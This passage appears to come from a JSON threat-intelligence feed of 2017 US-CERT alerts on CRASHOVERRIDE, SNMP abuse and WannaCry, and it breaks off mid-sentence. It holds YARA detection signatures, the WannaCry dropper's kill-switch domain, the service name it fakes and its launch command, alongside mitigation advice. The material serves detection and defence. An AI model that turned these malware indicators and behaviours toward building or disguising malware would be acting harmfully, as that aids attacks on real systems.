“CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><br /><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_weirdMutex<br />{<br />meta:<br />description = “Blank mutex creation assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }<br />$s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_serviceStomper<br />{<br />meta:<br />description = “Identify service hollowing and persistence setting”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }<br />$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperModuleRegistry<br />{<br />meta:<br />description = “Registry Wiper functionality assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }<br />$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }<br />$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperFileManipulation<br />{<br />meta:<br />description = “File manipulation actions associated with CRASHOVERRIDE wip¬er”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }<br />$s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }<br />condition:<br />all of them<br />}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.<br /> </li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>Properly implemented defensive techniques and common cyber hygiene practices increase the complexity of barriers that adversaries must overcome to gain unauthorized access to critical information networks and systems. In addition, detection and prevention mechanisms can expose malicious network activity, enabling organizations to contain and respond to intrusions more rapidly. There is no set of defensive techniques or programs that will completely avert all attacks however, layered cybersecurity defenses will aid in reducing an organization’s attack surface and will increase the likelihood of detection. This layered mitigation approach is known as defense-in-depth.<br />NCCIC has based its mitigations and recommendations on its analysis of the public reporting of this malware and will be provide updates as more information becomes available.<br />Critical infrastructure companies should ensure that they are following best practices, which are outlined in the <a href=\"http://ics-cert.us-cert.gov/sites/default/files/documents/Seven Steps to Effectively Defend Industrial Control Systems_S508C.pdf\">Seven Steps to Effectively Defend Industrial Control Systems</a> document produced jointly by DHS, NSA, and FBI.</p><h4>Application Whitelisting</h4><p>Application whitelisting (AWL) can detect and prevent attempted execution of malware uploaded by adversaries. Application whitelisting hardens operating systems and prevents the execution of unauthorized software. The static nature of some systems, such as database servers and human-machine interface (HMI) computers make these ideal candidates to run AWL. NCCIC encourages operators to work with their vendors to baseline and calibrate AWL deployments.<br />Operators may choose to implement directory whitelisting rather than trying to list every possible permutation of applications in an environment. Operators may implement application or application directory whitelisting through Microsoft Software Restriction Policy (SRP), AppLocker, or similar application whitelisting software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</p><h4>Manage Authentication and Authorization</h4><p>This malware exploits the lack of authentication and authorization in common ICS protocols to issue unauthorized commands to field devices. Asset owners/operators should implement authentication and authorization protocols to ensure field devices verify the authenticity of commands before they are actioned. In some instances, legacy hardware may not be capable of implementing these protections. In these cases, asset owners can either leverage ICS firewalls to do stateful inspection and authentication of commands, or upgrade their control field devices.</p><p>Adversaries are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Compromising these credentials allows adversaries to masquerade as legitimate users, leaving less evidence of compromise than more traditional attack options (i.e., exploiting vulnerabilities or uploading malware). For this reason, operators should implement multi-factor authentication where possible and reduce privileges to only those needed for a user’s duties. If passwords are necessary, operators should implement secure password policies, stressing length over complexity. For all accounts, including system and non-interactive accounts, operators should ensure credentials are unique, and changed, at a minimum, every 90 days.</p><p>NCCIC also recommends that operators require separate credentials for corporate and control network zones and store them in separate trust stores. Operators should never share Active Directory, RSA ACE servers, or other trust stores between corporate and control networks. Specifically, operators should:</p><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege;</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a remote desktop protocol session;</li><li>Remove unnecessary accounts, groups, and restrict root access;</li><li>Control and limit local administration; and</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash attacks.</li></ul><h4>Handling Destructive Malware</h4><p>Destructive malware continues to be a threat to both critical infrastructure and business systems. NCCIC encourages organizations to review the <a href=\"https://ics-cert.us-cert.gov/sites/default/files/documents/Destructive_Malware_White_Paper_S508C.pdf\">ICS-CERT destructive malware white paper</a> for detailed mitigation guidance. It is important for organizations to maintain backups of key data, systems, and configurations such as:</p><ul><li>Server gold images,</li><li>ICS Workstation gold configurations,</li><li>Engineering workstation images,</li><li>PLC/RTU configurations,</li><li>Passwords and configuration information, and</li><li>Offline copies of install media for operating systems and control applications.</li></ul><h4>Ensure Proper Configuration/Patch Management</h4><p>Adversaries often target unpatched systems. A configuration/patch management program centered on the safe importation and implementation of trusted patches will help render control systems more secure.</p><p>Such a program will start with an accurate baseline and asset inventory to track what patches are needed. The program will prioritize patching and configuration management of “PC-architecture” machines used in HMI, database server, and engineering workstation roles, as current adversaries have significant cyber capabilities against these systems. Infected laptops are a significant malware vector. Such a program will limit the connection of external laptops to the control network and ideally supply vendors with known-good company laptops. The program will also encourage initial installation of any updates onto a test system that includes malware detection features before the updates are installed on operational systems.</p><p>NCCIC recommends that operators:</p><ul><li>Use best practices when downloading software and patches destined for their control network;</li><li>Take measures to avoid watering hole attacks;</li><li>Use a web Domain Name System (DNS) reputation system;</li><li>Obtain and apply updates from authenticated vendor sites;</li><li>Validate the authenticity of downloads;</li><li>Insist that vendors digitally sign updates, and/or publish hashes via an out-of-bound communications path, and only use this path to authenticate;</li><li>Never load updates from unverified sources; and</li><li>Reduce your attack surface area.</li></ul><p>To the greatest extent possible, NCCIC recommends that operators:</p><ul><li>Isolate ICS networks from any untrusted networks, especially the Internet;</li><li>Lock down all unused ports;</li><li>Turn off all unused services; and</li><li>Only allow real-time connectivity to external networks if there is a defined business requirement or control function.<ul><li>If one-way communication can accomplish a task, operators should use optical separation (“data diode”).</li><li>If bidirectional communication is necessary, operators should use a single open port over a restricted network path.</li></ul></li></ul><h4>Build a Defendable Environment</h4><p>Building a defendable environment will help limit the impact from network perimeter breaches. NCCIC recommends operators segment networks into logical enclaves and restrict host-to-host communications paths. This can prevent adversaries from expanding their access, while allowing the normal system communications to continue operating. Enclaving limits possible damage, as threat actors cannot use compromised systems to reach and contaminate systems in other enclaves. Containment provided by enclaving also makes incident cleanup significantly less costly.</p><p>If one-way data transfer from a secure zone to a less secure zone is required, operators should consider using approved removable media instead of a network connection. If real-time data transfer is required, operators should consider using optical separation technologies. This allows replication of data without placing the control system at risk.</p><p>Additional details on effective strategies for building a defendable ICS network can be found in the <a href=\"http://ics-cert.us-cert.gov/Abstract-Defense-Depth-RP\">ICS-CERT Defense-in-Depth Recommended Practice</a>.</p><h4>Implement Secure Remote Access</h4><p>Some adversaries are effective at gaining remote access into control systems, finding obscure access vectors, even “hidden back doors” intentionally created by system operators. Operators should remove such accesses wherever possible, especially modems, as these are fundamentally insecure.<br />Operators should:</p><ul><li>Limit any accesses that remain;</li><li>Where possible, implement “monitoring only” access enforced by data diodes, and not rely on “read only” access enforced by software configurations or permissions;</li><li>Not allow remote persistent vendor connections into the control network;</li><li>Require any remote access to be operator controlled, time limited, and procedurally similar to “lock out, tag out”;</li><li>Use the same remote access paths for vendor and employee connections; do not allow double standards; and</li><li>Use two-factor authentication if possible, avoiding schemes where both tokens are similar and can be easily stolen (e.g., password and soft certificate).</li></ul><h4>Monitor and Respond</h4><p>Defending a network against modern threats requires actively monitoring for adversarial penetration and quickly executing a prepared response. Operators should:</p><ul><li>Consider establishing monitoring programs in the following key places: at the Internet boundary; at the business to Control DMZ boundary; at the Control DMZ to control LAN boundary; and inside the Control LAN;</li><li>Watch IP traffic on ICS boundaries for abnormal or suspicious communications;</li><li>Monitor IP traffic within the control network for malicious connections or content;</li><li>Use host-based products to detect malicious software and attack attempts;<ul><li>Use login analysis (e.g., time and place) to detect stolen credential usage or improper access, verifying all anomalies with quick phone calls;</li><li>Watch account and user administration actions to detect access control manipulation;</li></ul></li><li>Have a response plan for when adversarial activity is detected; and<ul><li>Such a plan may include disconnecting all Internet connections, running a properly scoped search for malware, disabling affected user accounts, isolating suspect systems, and immediately resetting 100 percent of passwords.</li><li>Such a plan may also define escalation triggers and actions, including incident response, investigation, and public affairs activities.</li></ul></li><li>Have a restoration plan, including “gold disks” ready to restore systems to known good states.<br /> </li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">[1] ESET: WIN32/INDUSTROYER – A New Threat for Industrial Control Systems</a></li>\n\t\t\t\t\t<li><a href=\"https://www.dragos.com/blog/crashoverride/\">[2] Dragos: CRASHOVERRIDE</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 12, 2017: Initial Release</li>\n\t\t\t\t\t\t<li>June 13, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t\t\t\t\t<li>July 7, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t\t\t\t\t<li>July 21, 2017: Corrected typographical error</li>\n\t\t\t\t\t\t<li>July 24, 2017: Corrected links to downloadable IOC files</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-06-12T21:44:47.000Z"
		},
		{
			"type": "report",
			"title": "TA17-156A: Reducing the Risk of SNMP Abuse",
			"name": "TA17-156A: Reducing the Risk of SNMP Abuse",
			"id": "report-bdbbf2a1-6dd7-4073-b39f-968c9fe75fab",
			"description": "Original release date: June 05, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>SNMP enabled devices</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The Simple Network Management Protocol (SNMP) may be abused to gain unauthorized access to network devices. SNMP provides a standardized framework for a common language that is used for monitoring and managing devices in a network.</p><p>This Alert provides information on SNMP best practices, along with prevention and mitigation recommendations.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>SNMP depends on secure strings (or “community strings”) that grant access to portions of devices’ management planes. Abuse of SNMP could allow an unauthorized third party to gain access to a network device. </p><p>SNMPv3 should be the only version of SNMP employed because SNMPv3 has the ability to authenticate and encrypt payloads. When either SNMPv1 or SNMPv2 are employed, an adversary could sniff network traffic to determine the community string. This compromise could enable a man-in-the-middle or replay attack.</p><p>Although SNMPv1 and SNMPv2 have similar characteristics, 64-bit counters were added to SNMPv2 so it could support faster interfaces. SNMPv3 replaces the simple/clear text password sharing used in SNMPv2 with more securely encoded parameters. All versions run over the User Datagram Protocol (UDP).</p><p>Simply using SNMPv3 is not enough to prevent abuse of the protocol. A safer approach is to combine SNMPv3 with management information base (MIB) whitelisting using SNMP views. This technique ensures that even with exposed credentials, information cannot be read from or written to the device unless the information is needed for monitoring or normal device re-configuration. The majority of devices that support SNMP contain a generic set of MIBs that are vendor agnostic. This approach allows the object identifier (OID) to be applied to devices regardless of manufacturer.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A remote attacker may abuse SNMP-enabled network devices to access an organization’s network infrastructure.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>A fundamental way to enhance network infrastructure security is to safeguard networking devices with secure configurations. US-CERT recommends that administrators:</p><ul><li>Configure SNMPv3 to use the highest level of security available on the device; this would be <em>authPriv</em> on most devices. <em>authPriv</em> includes authentication and encryption features, and employing both features enhances overall network security. Some older images may not contain the cryptographic feature set, in which case <em>authNoPriv</em> needs to be used. However, if the device does not support Version 3 <em>authPriv</em>, it should be upgraded.</li><li>Ensure administrative credentials are properly configured with different passwords for authentication and encryption. In configuring accounts, follow the principle of least privilege. Role separation between polling/receiving traps (reading) and configuring users or groups (writing) is imperative because many SNMP managers require login credentials to be stored on disk in order to receive traps.</li><li>Refer to your vendor’s guidance for implementing SNMP views. SNMP view is a command that can be used to limit the available OIDs. When OIDs are included in the view, all other MIB trees are inherently denied. The SNMP <em>view</em> command must be used in conjunction with a predefined list of MIB objects.</li><li>Apply extended access control lists (ACLs) to block unauthorized computers from accessing the device. Access to devices with read and/or write SNMP permission should be strictly controlled. If monitoring and change management are done through separate software, then they should be on separate devices.</li><li>Segregate SNMP traffic onto a separate management network. Management network traffic should be out-of-band; however, if device management must coincide with standard network activity, all communication occurring over that network should use some encryption capability. If the network device has a dedicated management port, it should be the sole link for services like SNMP, Secure Shell (SSH), etc.</li><li>Keep system images and software up-to-date.</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.ietf.org/rfc/rfc2233.txt\">The Interfaces Group MIB using SMIv2</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 5, 2017: Initial Release</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "9010 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-156A",
					"source_name": "open source",
					"description": "Original release date: June 05, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>SNMP enabled devices</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The Simple Network Management Protocol (SNMP) may be abused to gain unauthorized access to network devices. SNMP provides a standardized framework for a common language that is used for monitoring and managing devices in a network.</p><p>This Alert provides information on SNMP best practices, along with prevention and mitigation recommendations.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>SNMP depends on secure strings (or “community strings”) that grant access to portions of devices’ management planes. Abuse of SNMP could allow an unauthorized third party to gain access to a network device. </p><p>SNMPv3 should be the only version of SNMP employed because SNMPv3 has the ability to authenticate and encrypt payloads. When either SNMPv1 or SNMPv2 are employed, an adversary could sniff network traffic to determine the community string. This compromise could enable a man-in-the-middle or replay attack.</p><p>Although SNMPv1 and SNMPv2 have similar characteristics, 64-bit counters were added to SNMPv2 so it could support faster interfaces. SNMPv3 replaces the simple/clear text password sharing used in SNMPv2 with more securely encoded parameters. All versions run over the User Datagram Protocol (UDP).</p><p>Simply using SNMPv3 is not enough to prevent abuse of the protocol. A safer approach is to combine SNMPv3 with management information base (MIB) whitelisting using SNMP views. This technique ensures that even with exposed credentials, information cannot be read from or written to the device unless the information is needed for monitoring or normal device re-configuration. The majority of devices that support SNMP contain a generic set of MIBs that are vendor agnostic. This approach allows the object identifier (OID) to be applied to devices regardless of manufacturer.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A remote attacker may abuse SNMP-enabled network devices to access an organization’s network infrastructure.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>A fundamental way to enhance network infrastructure security is to safeguard networking devices with secure configurations. US-CERT recommends that administrators:</p><ul><li>Configure SNMPv3 to use the highest level of security available on the device; this would be <em>authPriv</em> on most devices. <em>authPriv</em> includes authentication and encryption features, and employing both features enhances overall network security. Some older images may not contain the cryptographic feature set, in which case <em>authNoPriv</em> needs to be used. However, if the device does not support Version 3 <em>authPriv</em>, it should be upgraded.</li><li>Ensure administrative credentials are properly configured with different passwords for authentication and encryption. In configuring accounts, follow the principle of least privilege. Role separation between polling/receiving traps (reading) and configuring users or groups (writing) is imperative because many SNMP managers require login credentials to be stored on disk in order to receive traps.</li><li>Refer to your vendor’s guidance for implementing SNMP views. SNMP view is a command that can be used to limit the available OIDs. When OIDs are included in the view, all other MIB trees are inherently denied. The SNMP <em>view</em> command must be used in conjunction with a predefined list of MIB objects.</li><li>Apply extended access control lists (ACLs) to block unauthorized computers from accessing the device. Access to devices with read and/or write SNMP permission should be strictly controlled. If monitoring and change management are done through separate software, then they should be on separate devices.</li><li>Segregate SNMP traffic onto a separate management network. Management network traffic should be out-of-band; however, if device management must coincide with standard network activity, all communication occurring over that network should use some encryption capability. If the network device has a dedicated management port, it should be the sole link for services like SNMP, Secure Shell (SSH), etc.</li><li>Keep system images and software up-to-date.</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.ietf.org/rfc/rfc2233.txt\">The Interfaces Group MIB using SMIv2</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 5, 2017: Initial Release</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-06-06T00:11:16.000Z"
		},
		{
			"type": "report",
			"title": "TA17-132A: Indicators Associated With WannaCry Ransomware",
			"name": "TA17-132A: Indicators Associated With WannaCry Ransomware",
			"id": "report-0cdcfcec-1ac4-4de4-a9b4-d281e6c9c6ad",
			"description": "Original release date: May 12, 2017 | Last revised: May 19, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Microsoft Windows operating systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>According to numerous open-source reports, a widespread ransomware campaign is affecting various organizations with reports of tens of thousands of infections in over 150 countries, including the United States, United Kingdom, Spain, Russia, Taiwan, France, and Japan. The software can run in as many as 27 different languages.</p><p>The latest version of this ransomware variant, known as WannaCry, WCry, or Wanna Decryptor, was discovered the morning of May 12, 2017, by an independent security researcher and has spread rapidly over several hours, with initial reports beginning around 4:00 AM EDT, May 12, 2017. Open-source reporting indicates a requested ransom of .1781 bitcoins, roughly $300 U.S.<br /><br />This Alert is the result of efforts between the Department of Homeland Security (DHS) National Cybersecurity and Communications Integration Center (NCCIC) and the Federal Bureau of Investigation (FBI) to highlight known cyber threats. DHS and the FBI continue to pursue related information of threats to federal, state, and local government systems and as such, further releases of technical information may be forthcoming.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Initial reports indicate the hacker or hacking group behind the WannaCry campaign is gaining access to enterprise servers through the exploitation of a critical Windows SMB vulnerability. Microsoft released a security update for the <a href=\"https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\">MS17-010</a> vulnerability on March 14, 2017. Additionally, Microsoft released patches for <a href=\"http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598\">Windows XP, Windows 8, and Windows Server 2003</a> operating systems on May 13, 2017. </p><p>According to open sources, one possible infection vector may be through phishing.</p><h3>Technical Details</h3><h4><em>Indicators of Compromise (IOC)</em></h4><p>See <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_WannaCry.xlsx\">TA17-132A_WannaCry.xlsx</a> and <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_WannaCry_stix.xml\">TA17-132A_WannaCry_stix.xml</a> for IOCs developed immediately after WannaCry ransomware appeared. These links contain identical content in two different formats.</p><p>See <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_stix.xml\">TA17-132A_stix.xml</a> for IOCs developed after further analysis of the WannaCry malware.</p><h4><em>Analysis</em></h4><p>Three files were submitted to US-CERT for analysis. All files are confirmed as components of a ransomware campaign identified as \"WannaCry\", a.k.a \"WannaCrypt\" or \".wnCry\". The first file is a dropper, which contains and runs the ransomware, propagating via the MS17-010/EternalBlue SMBv1.0 exploit. The remaining two files are ransomware components containing encrypted plug-ins responsible for encrypting the victim users files. For a list of IOCs found during analysis, see the <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_stix.xml\">STIX</a> file.</p><p>Displayed below are YARA signatures that can be used to detect the ransomware:</p><h4><em>Yara Signatures</em></h4><table border=\"1\" bordercolor=\"#ccc\" cellpadding=\"5\" cellspacing=\"0\" class=\"general-table\" style=\"border-collapse: collapse;\"><tbody><tr><td><p><code>rule Wanna_Cry_Ransomware_Generic {</code></p><p><code>       meta:</code></p><p><code>              description = \"Detects WannaCry Ransomware on Disk and in Virtual Page\"</code></p><p><code>              author = \"US-CERT Code Analysis Team\"</code></p><p><code>              reference = \"not set\"                                        </code></p><p><code>              date = \"2017/05/12\"</code></p><p><code>       hash0 = \"4DA1F312A214C07143ABEEAFB695D904\"</code></p><p><code>       strings:</code></p><p><code>              $s0 = {410044004D0049004E0024}</code></p><p><code>              $s1 = \"WannaDecryptor\"</code></p><p><code>              $s2 = \"WANNACRY\"</code></p><p><code>              $s3 = \"Microsoft Enhanced RSA and AES Cryptographic\"</code></p><p><code>              $s4 = \"PKS\"</code></p><p><code>              $s5 = \"StartTask\"</code></p><p><code>              $s6 = \"wcry@123\"</code></p><p><code>              $s7 = {2F6600002F72}</code></p><p><code>              $s8 = \"unzip 0.15 Copyrigh\"</code></p><p><code>              $s9 = \"Global\\\\WINDOWS_TASKOSHT_MUTEX\"</code>        </p><p> <code>             <code>$</code>s10 = \"Global\\\\WINDOWS_TASKCST_MUTEX\"</code>   </p><p><code>             $s11 = {7461736B736368652E657865000000005461736B5374617274000000742E776E7279000069636163}</code></p><p><code>             $s12 = {6C73202E202F6772616E742045766572796F6E653A46202F54202F43202F5100617474726962202B68}</code></p><p><code>             $s13 = \"WNcry@2ol7\"</code></p><p><code>             $s14 = \"wcry@123\"</code></p><p><code>             $s15 = \"Global\\\\MsWinZonesCacheCounterMutexA\"</code></p><p><code>       condition:</code></p><p><code>              $s0 and $s1 and $s2 and $s3 or $s4 and $s5 and $s6 and $s7 or $s8 and $s9 and $s10 or $s11 and $s12 or $s13 or $s14 or $s15</code></p><p><code>}</code></p><p><code>/*The following Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.*/</code></p><p><code>rule MS17_010_WanaCry_worm {</code></p><p><code>       meta:</code></p><p><code>              description = \"Worm exploiting MS17-010 and dropping WannaCry Ransomware\"</code></p><p><code>              author = \"Felipe Molina (@felmoltor)\"</code></p><p><code>              reference = \"https://www.exploit-db.com/exploits/41987/\"</code></p><p><code>              date = \"2017/05/12\"</code></p><p><code>       strings:</code></p><p><code>              $ms17010_str1=\"PC NETWORK PROGRAM 1.0\"</code></p><p><code>              $ms17010_str2=\"LANMAN1.0\"</code></p><p><code>              $ms17010_str3=\"Windows for Workgroups 3.1a\"</code></p><p><code>              $ms17010_str4=\"__TREEID__PLACEHOLDER__\"</code></p><p><code>              $ms17010_str5=\"__USERID__PLACEHOLDER__\"</code></p><p><code>              $wannacry_payload_substr1 = \"h6agLCqPqVyXi2VSQ8O6Yb9ijBX54j\"</code></p><p><code>              $wannacry_payload_substr2 = \"h54WfF9cGigWFEx92bzmOd0UOaZlM\"</code></p><p><code>              $wannacry_payload_substr3 = \"tpGFEoLOU6+5I78Toh/nHs/RAP\"</code></p><p><code>       condition:</code></p><p><code>              all of them</code></p><p><code>}</code></p></td></tr></tbody></table><h4><em>Dropper</em></h4><p>This artifact (5bef35496fcbdbe841c82f4d1ab8b7c2) is a malicious PE32 executable that has been identified as a WannaCry ransomware dropper. Upon execution, the dropper attempts to connect to the following hard-coded URI:</p><p><code>http[:]//www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com.</code></p><p>Displayed below is a sample request observed:</p><p><code>--Begin request—</code></p><p><code>GET / HTTP/1.1<br />Host: www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com<br />Cache-Control: no-cache</code></p><p><code>--End request--</code></p><p>If a connection is established, the dropper will terminate execution. If the connection fails, the dropper will infect the system with ransomware.<br />When executed, the malware is designed to run as a service with the parameters “-m security”. During runtime, the malware determines the<br />number of arguments passed during execution. If the arguments passed are less than two, the dropper proceeds to install itself as the<br />following service:</p><p><code>--Begin service--</code></p><p><code>ServiceName = \"mssecsvc2.0\"<br />DisplayName = \"Microsoft Security Center (2.0) Service\"<br />StartType = SERVICE_AUTO_START<br />BinaryPathName = \"%current directory%5bef35496fcbdbe841c82f4d1ab8b7c2.exe -m security\"</code></p><p><code>--End service--</code></p><p>Once the malware starts as a service named mssecsvc2.0, the dropper attempts to create and scan a list of IP ranges on the local network<br />and attempts to connect using UDP ports 137, 138 and TCP ports 139, 445. If a connection to port 445 is successful, it creates an additional<br />thread to propagate by exploiting the SMBv1 vulnerability documented by Microsoft Security bulliten MS17-010. The malware then extracts &amp;<br />installs a PE32 binary from it's resource section named \"R\". This binary has been identified as the ransomware component of WannaCrypt.<br />The dropper installs this binary into \"C:\\WINDOWS\\tasksche.exe.\" The dropper executes tasksche.exe with the following command:</p><p><code>--Begin command--</code></p><p><code>\"C:\\WINDOWS\\tasksche.exe /i\"</code></p><p><code>--End command—</code></p><p>Note:<br />=====<br />When this sample was initially discovered, the domain \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\" was not registered, allowing the<br />malware to run and propagate freely. However within a few days, researchers learned that by registering the domain and allowing the<br />malware to connect, it's ability to spread was greatly reduced. At this time, all traffic to \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" is<br />re-directed to a monitored, non-malicious server, causing the malware to terminate if it is allowed to connect. For this reason, we recommend<br />that administrators and network security personnel not block traffic to this domain.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>Ransomware not only targets home users; businesses can also become infected with ransomware, leading to negative consequences, including</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul><p>Paying the ransom does not guarantee the encrypted files will be released; it only guarantees that the malicious actors receive the victim’s money, and in some cases, their banking information. In addition, decrypting files does not mean the malware infection itself has been removed.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong><u>Recommended Steps for Prevention </u></strong></p><ul><li>Apply the Microsoft patch for the MS17-010 SMB vulnerability dated March 14, 2017.</li><li>Enable strong spam filters to prevent phishing emails from reaching the end users and authenticate in-bound email using technologies like Sender Policy Framework (SPF), Domain Message Authentication Reporting and Conformance (DMARC), and DomainKeys Identified Mail (DKIM) to prevent email spoofing. </li><li>Scan all incoming and outgoing emails to detect threats and filter executable files from reaching the end users.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. No users should be assigned administrative access unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls including file, directory, and network share permissions with least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Disable macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Office suite applications.</li><li>Develop, institute, and practice employee education programs for identifying scams, malicious links, and attempted social engineering.</li><li>Run regular penetration tests against the network, no less than once a year. Ideally, run these as often as possible and practical.</li><li>Test your backups to ensure they work correctly upon use.</li></ul><p><strong><u>Recommendations for Network Protection </u></strong></p><p>Apply the patch (MS17-010). If the patch cannot be applied, consider:</p><ul><li>Disabling SMBv1 and</li><li>blocking all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139, for all boundary devices.</li></ul><p><em><strong>Note:</strong> disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. The benefits of mitigation should be weighed against potential disruptions to 